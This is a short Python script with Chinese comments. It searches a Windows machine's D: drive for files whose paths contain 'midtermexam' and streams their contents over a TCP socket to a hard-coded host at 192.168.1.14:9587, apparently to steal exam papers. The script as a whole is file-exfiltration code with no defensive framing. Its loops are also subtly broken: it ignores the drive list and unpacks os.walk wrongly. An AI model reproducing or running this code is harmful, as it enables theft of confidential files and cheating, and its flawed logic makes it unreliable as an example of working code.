import os
import re
import socket
import time

# 获取所有驱动器
drives = os.popen('wmic logicaldisk get caption')
drives = [drive.strip() for drive in drives if drive.strip()]

# 创建一个空列表，用于存储找到的文件
exam_file_list = []

# 遍历每个盘符
for drive in drives:
    path = os.path.join(drive, "\\")  # 构造要搜索的目录
    # 使用 os.walk 函数遍历指定目录中的所有文件
    for dirPath, fileNames in os.walk("D:"):
        # 遍历目录中的每个文件
        for file in fileNames:
            # 判断文件名是否包含 "midtermexam"，并且不是以 ".lnk" 结尾的文件
            if re.search("midtermexam", os.path.join(dirPath, file)) and not file.endswith('.lnk'):
                # 如果是，将文件路径添加到列表中
                exam_file_list.append(os.path.join(dirPath, file))
# 打印找到的所有 "midtermexam" 文件路径
exam_file_list = [elem for elem in exam_file_list if not elem.startswith('\\')]
print(f'exam_file_list', exam_file_list)

# 创建一个新的套接字来连接到服务器
client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client_socket.connect(("192.168.1.14", 9587))  # 连接到服务器

# 遍历找到的所有 "midtermexam" 文件
for exam_file in exam_file_list:
    # 获取文件大小
    file_size = os.path.getsize(exam_file)
    # 发送文件名和文件大小
    client_socket.sendall(f"{os.path.basename(exam_file)}\n{file_size}".encode())
    print(f"{os.path.basename(exam_file)}\n{file_size}".encode())

    # 使用二进制模式打开文件并读取内容
    with open(exam_file, "rb") as f:
        while True:
            # 一次读取 1024 字节
            data = f.read(1048576)
            if not data:
                break
            # 发送数据
            print(data)
            client_socket.sendall(data)
            print("file send complete")
            time.sleep(2)

# 发送结束语
client_socket.sendall(b"over")
# 关闭套接字
client_socket.close()
print("connection closed")
